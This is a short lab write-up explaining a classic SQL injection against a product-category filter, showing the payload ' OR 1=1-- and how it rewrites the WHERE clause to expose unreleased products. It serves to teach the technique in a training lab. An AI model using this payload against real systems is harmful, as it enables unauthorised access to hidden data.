# Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Concept:

The application directly inserts the category value
into the SQL query:

SELECT * FROM products
WHERE category='Gifts' AND released=1


Payload:

' OR 1=1--


The query becomes:

SELECT * FROM products
WHERE category='' OR 1=1--' AND released=1


Why does it work?

1. '      → Closes the original string.
2. OR 1=1 → Adds a condition that is always TRUE.
3. --     → Comments out the rest of the query.


Result:

1=1 → TRUE → OR TRUE → The WHERE condition becomes TRUE → released=1 is ignored → Unreleased products are displayed
